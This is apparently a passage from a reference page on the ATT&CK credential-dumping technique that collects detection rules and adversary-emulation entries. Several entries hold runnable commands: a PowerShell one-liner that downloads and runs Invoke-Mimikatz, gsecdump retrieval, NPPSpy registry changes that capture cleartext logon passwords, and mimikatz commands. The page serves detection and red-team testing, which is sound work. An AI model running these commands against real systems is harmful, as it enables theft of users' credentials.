           '    service: sysmon\n'
           'detection:\n'
           '    selection1:\n'
           '        EventID: 1\n'
           "        Image: '* \\ procdump * .exe'\n"
           '        Product: ProcDump\n'
           '        OriginalFileName: procdump\n'
           "        CommandLine: 'procdump * .exe -ma lsass.exe * .dmp'\n"
           '    selection2:\n'
           '        EventID: 10\n'
           "        SourceImage: '* \\ procdump * .exe'\n"
           "        TargetImage: 'C: \\ Windows \\ system32 \\ lsass.exe'\n"
           '    timeframe: last 1m\n'
           '    condition: all of them\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': '',
                                                  'Category': 'T1003',
                                                  'Cobalt Strike': 'hashdump\n'
                                                                   'mimikatz '
                                                                   '!lsadump::sam',
                                                  'Description': 'Dumps hashes '
                                                                 'from the SAM '
                                                                 'Hive file.',
                                                  'Metasploit': 'hashdump\n'
                                                                'run hashdump\n'
                                                                'run '
                                                                'smart_hashdump\n'
                                                                'post/windows/gather/credentials/domain_hashdump'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': '',
                                                  'Category': 'T1003',
                                                  'Cobalt Strike': 'logonpasswords\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::logonpasswords\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::msv\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::kerberos\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::wdigest',
                                                  'Description': 'This '
                                                                 'technique '
                                                                 'injects into '
                                                                 'the '
                                                                 'LSASS.exe '
                                                                 'process and '
                                                                 'scrapes its '
                                                                 'memory for '
                                                                 'plaintext '
                                                                 'passwords of '
                                                                 'logged on '
                                                                 'users. You '
                                                                 'must do this '
                                                                 'from a high '
                                                                 'integrity '
                                                                 'process. \n'
                                                                 'The Mimikatz '
                                                                 'project has '
                                                                 'a lot of '
                                                                 'different '
                                                                 'capabilities '
                                                                 '(https://github.com/gentilkiwi/mimikatz/wiki) '
                                                                 'such as '
                                                                 'pass-the-hash, '
                                                                 'pass-the-ticket, '
                                                                 'creating '
                                                                 'silver/golden '
                                                                 'tickets, '
                                                                 'dumping '
                                                                 'credentials, '
                                                                 'and '
                                                                 'elevating a '
                                                                 'process.',
                                                  'Metasploit': 'use mimikatz\n'
                                                                'wdigest\n'
                                                                'msv\n'
                                                                'kerberos\n'
                                                                'logonpasswords'}},
 {'Atomic Red Team Test - OS Credential Dumping': {'atomic_tests': [{'auto_generated_guid': '66fb0bc1-3c3f-47e9-a298-550ecfefacbc',
                                                                     'description': 'Dumps '
                                                                                    'credentials '
                                                                                    'from '
                                                                                    'memory '
                                                                                    'via '
                                                                                    'Powershell '
                                                                                    'by '
                                                                                    'invoking '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'mimikatz '
                                                                                    'script.\n'
                                                                                    'If '
                                                                                    'Mimikatz '
                                                                                    'runs '
                                                                                    'successfully '
                                                                                    'you '
                                                                                    'will '
                                                                                    'see '
                                                                                    'several '
                                                                                    'usernames '
                                                                                    'and '
                                                                                    'hashes '
                                                                                    'output '
                                                                                    'to '
                                                                                    'the '
                                                                                    'screen.\n'
                                                                                    'Common '
                                                                                    'failures '
                                                                                    'include '
                                                                                    'seeing '
                                                                                    'an '
                                                                                    '\\"access '
                                                                                    'denied\\" '
                                                                                    'error '
                                                                                    'which '
                                                                                    'results '
                                                                                    'when '
                                                                                    'Anti-Virus '
                                                                                    'blocks '
                                                                                    'execution. \n'
                                                                                    'Or, '
                                                                                    'if '
                                                                                    'you '
                                                                                    'try '
                                                                                    'to '
                                                                                    'run '
                                                                                    'the '
                                                                                    'test '
                                                                                    'without '
                                                                                    'the '
                                                                                    'required '
                                                                                    'administrative '
                                                                                    'privleges '
                                                                                    'you '
                                                                                    'will '
                                                                                    'see '
                                                                                    'this '
                                                                                    'error '
                                                                                    'near '
                                                                                    'the '
                                                                                    'bottom '
                                                                                    'of '
                                                                                    'the '
                                                                                    'output '
                                                                                    'to '
                                                                                    'the '
                                                                                    'screen '
                                                                                    '"ERROR '
                                                                                    'kuhl_m_sekurlsa_acquireLSA"\n',
                                                                     'executor': {'command': 'IEX '
                                                                                             '(New-Object '
                                                                                             "Net.WebClient).DownloadString('#{remote_script}'); "
                                                                                             'Invoke-Mimikatz '
                                                                                             '-DumpCreds\n',
                                                                                  'elevation_required': True,
                                                                                  'name': 'powershell'},
                                                                     'input_arguments': {'remote_script': {'default': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1',
                                                                                                           'description': 'URL '
                                                                                                                          'to '
                                                                                                                          'a '
                                                                                                                          'remote '
                                                                                                                          'Mimikatz '
                                                                                                                          'script '
                                                                                                                          'that '
                                                                                                                          'dumps '
                                                                                                                          'credentials',
                                                                                                           'type': 'Url'}},
                                                                     'name': 'Powershell '
                                                                             'Mimikatz',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': '96345bfc-8ae7-4b6a-80b7-223200f24ef9',
                                                                     'dependencies': [{'description': 'Gsecdump '
                                                                                                      'must '
                                                                                                      'exist '
                                                                                                      'on '
                                                                                                      'disk '
                                                                                                      'at '
                                                                                                      'specified '
                                                                                                      'location '
                                                                                                      '(#{gsecdump_exe})\n',
                                                                                       'get_prereq_command': '[Net.ServicePointManager]::SecurityProtocol '
                                                                                                             '= '
                                                                                                             '[Net.SecurityProtocolType]::Tls12\n'
                                                                                                             '$parentpath '
                                                                                                             '= '
                                                                                                             'Split-Path '
                                                                                                             '"#{gsecdump_exe}"; '
                                                                                                             '$binpath '
                                                                                                             '= '
                                                                                                             '"$parentpath\\gsecdump-v2b5.exe"\n'
                                                                                                             'IEX(IWR '
                                                                                                             '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")\n'
                                                                                                             'if(Invoke-WebRequestVerifyHash '
                                                                                                             '"#{gsecdump_url}" '
                                                                                                             '"$binpath" '
                                                                                                             '#{gsecdump_bin_hash}){\n'
                                                                                                             '  '
                                                                                                             'Move-Item '
                                                                                                             '$binpath '
                                                                                                             '"#{gsecdump_exe}"\n'
                                                                                                             '}\n',
                                                                                       'prereq_command': 'if '
                                                                                                         '(Test-Path '
                                                                                                         '#{gsecdump_exe}) '
                                                                                                         '{exit '
                                                                                                         '0} '
                                                                                                         'else '
                                                                                                         '{exit '
                                                                                                         '1}\n'}],
                                                                     'dependency_executor_name': 'powershell',
                                                                     'description': 'Dump '
                                                                                    'credentials '
                                                                                    'from '
                                                                                    'memory '
                                                                                    'using '
                                                                                    'Gsecdump.\n'
                                                                                    '\n'
                                                                                    'Upon '
                                                                                    'successful '
                                                                                    'execution, '
                                                                                    'you '
                                                                                    'should '
                                                                                    'see '
                                                                                    "domain\\username's "
                                                                                    'following '
                                                                                    'by '
                                                                                    'two '
                                                                                    '32 '
                                                                                    'characters '
                                                                                    'hashes.\n'
                                                                                    '\n'
                                                                                    'If '
                                                                                    'you '
                                                                                    'see '
                                                                                    'output '
                                                                                    'that '
                                                                                    'says '
                                                                                    '"compat: '
                                                                                    'error: '
                                                                                    'failed '
                                                                                    'to '
                                                                                    'create '
                                                                                    'child '
                                                                                    'process", '
                                                                                    'execution '
                                                                                    'was '
                                                                                    'likely '
                                                                                    'blocked '
                                                                                    'by '
                                                                                    'Anti-Virus. \n'
                                                                                    'You '
                                                                                    'will '
                                                                                    'receive '
                                                                                    'only '
                                                                                    'error '
                                                                                    'output '
                                                                                    'if '
                                                                                    'you '
                                                                                    'do '
                                                                                    'not '
                                                                                    'run '
                                                                                    'this '
                                                                                    'test '
                                                                                    'from '
                                                                                    'an '
                                                                                    'elevated '
                                                                                    'context '
                                                                                    '(run '
                                                                                    'as '
                                                                                    'administrator)\n'
                                                                                    '\n'
                                                                                    'If '
                                                                                    'you '
                                                                                    'see '
                                                                                    'a '
                                                                                    'message '
                                                                                    'saying '
                                                                                    '"The '
                                                                                    'system '
                                                                                    'cannot '
                                                                                    'find '
                                                                                    'the '
                                                                                    'path '
                                                                                    'specified", '
                                                                                    'try '
                                                                                    'using '
                                                                                    'the '
                                                                                    'get-prereq_commands '
                                                                                    'to '
                                                                                    'download '
                                                                                    'and '
                                                                                    'install '
                                                                                    'Gsecdump '
                                                                                    'first.\n',
                                                                     'executor': {'command': '#{gsecdump_exe} '
                                                                                             '-a\n',
                                                                                  'elevation_required': True,
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'gsecdump_bin_hash': {'default': '94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC',
                                                                                                               'description': 'File '
                                                                                                                              'hash '
                                                                                                                              'of '
                                                                                                                              'the '
                                                                                                                              'Gsecdump '
                                                                                                                              'binary '
                                                                                                                              'file',
                                                                                                               'type': 'String'},
                                                                                         'gsecdump_exe': {'default': 'PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe',
                                                                                                          'description': 'Path '
                                                                                                                         'to '
                                                                                                                         'the '
                                                                                                                         'Gsecdump '
                                                                                                                         'executable',
                                                                                                          'type': 'Path'},
                                                                                         'gsecdump_url': {'default': 'https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe',
                                                                                                          'description': 'Path '
                                                                                                                         'to '
                                                                                                                         'download '
                                                                                                                         'Gsecdump '
                                                                                                                         'binary '
                                                                                                                         'file',
                                                                                                          'type': 'url'}},
                                                                     'name': 'Gsecdump',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': '9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6',
                                                                     'dependencies': [{'description': 'NPPSpy.dll '
                                                                                                      'must '
                                                                                                      'be '
                                                                                                      'available '
                                                                                                      'in '
                                                                                                      'local '
                                                                                                      'temp '
                                                                                                      'directory',
                                                                                       'get_prereq_command': 'Invoke-WebRequest '
                                                                                                             '-Uri '
                                                                                                             'https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll '
                                                                                                             '-OutFile '
                                                                                                             '"$env:Temp\\NPPSPY.dll"',
                                                                                       'prereq_command': 'if '
                                                                                                         '(Test-Path '
                                                                                                         '"$env:Temp\\NPPSPY.dll") '
                                                                                                         '{exit '
                                                                                                         '0} '
                                                                                                         'else '
                                                                                                         '{exit '
                                                                                                         '1}'}],
                                                                     'dependency_executor_name': 'powershell',
                                                                     'description': 'Changes '
                                                                                    'ProviderOrder '
                                                                                    'Registry '
                                                                                    'Key '
                                                                                    'Parameter '
                                                                                    'and '
                                                                                    'creates '
                                                                                    'Key '
                                                                                    'for '
                                                                                    'NPPSpy.\n'
                                                                                    'After '
                                                                                    "user's "
                                                                                    'logging '
                                                                                    'in '
                                                                                    'cleartext '
                                                                                    'password '
                                                                                    'is '
                                                                                    'saved '
                                                                                    'in '
                                                                                    'C:\\NPPSpy.txt.\n'
                                                                                    'Clean '
                                                                                    'up '
                                                                                    'deletes '
                                                                                    'the '
                                                                                    'files '
                                                                                    'and '
                                                                                    'reverses '
                                                                                    'Registry '
                                                                                    'changes.\n'
                                                                                    'NPPSpy '
                                                                                    'Source: '
                                                                                    'https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy',
                                                                     'executor': {'cleanup_command': '$cleanupPath '
                                                                                                     '= '
                                                                                                     'Get-ItemProperty '
                                                                                                     '-Path '
                                                                                                     '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" '
                                                                                                     '-Name '
                                                                                                     'PROVIDERORDER\n'
                                                                                                     '$cleanupUpdatedValue '
                                                                                                     '= '
                                                                                                     '$cleanupPath.PROVIDERORDER \n'
                                                                                                     '$cleanupUpdatedValue '
                                                                                                     '= '
                                                                                                     '$cleanupUpdatedValue '
                                                                                                     '-replace '
                                                                                                     "',NPPSpy',''\n"
                                                                                                     'Set-ItemProperty '
                                                                                                     '-Path '
                                                                                                     '$cleanupPath.PSPath '
                                                                                                     '-Name '
                                                                                                     '"PROVIDERORDER" '
                                                                                                     '-Value '
                                                                                                     '$cleanupUpdatedValue\n'
                                                                                                     'Remove-Item '
                                                                                                     '-Path '
                                                                                                     '"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy" '
                                                                                                     '-Recurse '
                                                                                                     '-ErrorAction '
                                                                                                     'Ignore\n'
                                                                                                     'Remove-Item '
                                                                                                     'C:\\NPPSpy.txt '
                                                                                                     '-ErrorAction '
                                                                                                     'Ignore\n'
                                                                                                     'Remove-Item '
                                                                                                     'C:\\Windows\\System32\\NPPSpy.dll '
                                                                                                     '-ErrorAction '
                                                                                                     'Ignore',
                                                                                  'command': 'Copy-Item '
                                                                                             '"$env:Temp\\NPPSPY.dll" '
                                                                                             '-Destination '
                                                                                             '"C:\\Windows\\System32"\n'
                                                                                             '$path '
                                                                                             '= '
                                                                                             'Get-ItemProperty '
                                                                                             '-Path '
                                                                                             '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" '
                                                                                             '-Name '
                                                                                             'PROVIDERORDER\n'
                                                                                             '$UpdatedValue '
                                                                                             '= '
                                                                                             '$Path.PROVIDERORDER '
                                                                                             '+ '
                                                                                             '",NPPSpy"\n'
                                                                                             'Set-ItemProperty '
                                                                                             '-Path '
                                                                                             '$Path.PSPath '
                                                                                             '-Name '
                                                                                             '"PROVIDERORDER" '
                                                                                             '-Value '
                                                                                             '$UpdatedValue\n'
                                                                                             '$rv '
                                                                                             '= '
                                                                                             'New-Item '
                                                                                             '-Path '
                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy '
                                                                                             '-ErrorAction '
                                                                                             'Ignore\n'
                                                                                             '$rv '
                                                                                             '= '
                                                                                             'New-Item '
                                                                                             '-Path '
                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
                                                                                             '-ErrorAction '
                                                                                             'Ignore\n'
                                                                                             '$rv '
                                                                                             '= '
                                                                                             'New-ItemProperty '
                                                                                             '-Path '
                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
                                                                                             '-Name '
                                                                                             '"Class" '
                                                                                             '-Value '
                                                                                             '2 '
                                                                                             '-ErrorAction '
                                                                                             'Ignore\n'
                                                                                             '$rv '
                                                                                             '= '
                                                                                             'New-ItemProperty '
                                                                                             '-Path '
                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
                                                                                             '-Name '
                                                                                             '"Name" '
                                                                                             '-Value '
                                                                                             'NPPSpy '
                                                                                             '-ErrorAction '
                                                                                             'Ignore\n'
                                                                                             '$rv '
                                                                                             '= '
                                                                                             'New-ItemProperty '
                                                                                             '-Path '
                                                                                             'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider '
                                                                                             '-Name '
                                                                                             '"ProviderPath" '
                                                                                             '-PropertyType '
                                                                                             'ExpandString '
                                                                                             '-Value '
                                                                                             '"%SystemRoot%\\System32\\NPPSPY.dll" '
                                                                                             '-ErrorAction '
                                                                                             'Ignore\n'
                                                                                             'echo '
                                                                                             '"[!] '
                                                                                             'Please, '
                                                                                             'logout '
                                                                                             'and '
                                                                                             'log '
                                                                                             'back '
                                                                                             'in. '
                                                                                             'Cleartext '
                                                                                             'password '
                                                                                             'for '
                                                                                             'this '
                                                                                             'account '
                                                                                             'is '
                                                                                             'going '
                                                                                             'to '
                                                                                             'be '
                                                                                             'located '
                                                                                             'in '
                                                                                             'C:\\NPPSpy.txt"',
                                                                                  'elevation_required': True,
                                                                                  'name': 'powershell'},
                                                                     'name': 'Credential '
                                                                             'Dumping '
                                                                             'with '
                                                                             'NPPSpy',
                                                                     'supported_platforms': ['windows']}],
                                                   'attack_technique': 'T1003',
                                                   'display_name': 'OS '
                                                                   'Credential '
                                                                   'Dumping'}},
 {'Mitre Stockpile - Custom GO credential dumper using minidumpwritedump': {'description': 'Custom '
                                                                                           'GO '
                                                                                           'credential '
                                                                                           'dumper '
                                                                                           'using '
                                                                                           'minidumpwritedump',
                                                                            'id': '3c647015-ab0a-496a-8847-6ab173cd2b22',
                                                                            'name': 'MiniDumpWriteDump '
                                                                                    '(Spooky)',
                                                                            'platforms': {'windows': {'psh': {'cleanup': 'if '
                                                                                                                         '(Test-Path '
                                                                                                                         '"C:\\Users\\Public\\creds.dmp") '
                                                                                                                         '{\n'
                                                                                                                         '  '
                                                                                                                         'rm '
                                                                                                                         '"C:\\Users\\Public\\creds.dmp" '
                                                                                                                         '-Force;\n'
                                                                                                                         '};\n',
                                                                                                              'command': '.\\totallylegit.exe '
                                                                                                                         '#{host.process.id} '
                                                                                                                         'C:\\Users\\Public\\creds.dmp\n',
                                                                                                              'payloads': ['totallylegit.exe']}}},
                                                                            'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.process.id'}]}],
                                                                            'tactic': 'credential-access',
                                                                            'technique': {'attack_id': 'T1003',
                                                                                          'name': 'OS '
                                                                                                  'Credential '
                                                                                                  'Dumping'}}},
 {'Threat Hunting Tables': {'chain_id': '100053',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': 'ntds.dit',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1003',
                            'mitre_caption': 'credential dumping',
                            'os': 'windows',
                            'parent_process': 'ntdsutil.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1003': {'description': None,
                           'level': 'critical',
                           'name': 'Credential Dumping',
                           'phase': 'Credential Access',
                           'query': [{'op': 'and',
                                      'process': {'image': {'flag': 'regex',
                                                            'op': 'not',
                                                            'pattern': '\\\\Windows\\\\.+\\\\lsass.exe'}},
                                      'reg': {'path': {'pattern': 'HKLM\\SAM|HKLM\\Security'}},
                                      'type': 'reg'},
                                     {'file': {'path': {'flag': 'regex',
                                                        'pattern': '\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll'}},
                                      'type': 'file'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/ChromeDump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/ChromeDump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/FoxDump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/FoxDump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/ninjacopy":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/ninjacopy',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/add_keepass_config_trigger":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/add_keepass_config_trigger',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/find_keepass_config":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/find_keepass_config',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/get_keepass_config_trigger":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/get_keepass_config_trigger',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/keethief":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/keethief',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/collection/vaults/remove_keepass_config_trigger":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/collection/vaults/remove_keepass_config_trigger',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/enum_cred_store":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/enum_cred_store',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/cache":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/cache',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/command":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/command',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/dcsync":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/dcsync',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/dcsync_hashdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/dcsync_hashdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/extract_tickets":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/extract_tickets',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': 'T1097',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/golden_ticket":  '
                                                                                 '["T1003","T1097"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/golden_ticket',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/logonpasswords":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/logonpasswords',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/lsadump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/lsadump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/mimitokens":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/mimitokens',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/sam":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/sam',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': 'T1097',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/silver_ticket":  '
                                                                                 '["T1003","T1097"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/silver_ticket',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/trust_keys":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/trust_keys',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/powerdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/powerdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/vault_credential":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/credentials/vault_credential',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/downgrade_account":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/management/downgrade_account',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/wdigest_downgrade":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/management/wdigest_downgrade',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/gpp":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/privesc/gpp',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/mcafee_sitelist":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'powershell/privesc/mcafee_sitelist',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/linux/hashdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/linux/hashdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/linux/mimipenguin":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/linux/mimipenguin',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/osx/hashdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/osx/hashdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/collection/osx/kerberosdump":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/collection/osx/kerberosdump',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/management/multi/kerberos_inject":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/management/multi/kerberos_inject',
                                            'Technique': 'Credential Dumping'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1003',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/situational_awareness/network/dcos/etcd_crawler":  '
                                                                                 '["T1003"],',
                                            'Empire Module': 'python/situational_awareness/network/dcos/etcd_crawler',
                                            'Technique': 'Credential Dumping'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [Credential Dumping Mitigation](../mitigations/Credential-Dumping-Mitigation.md)

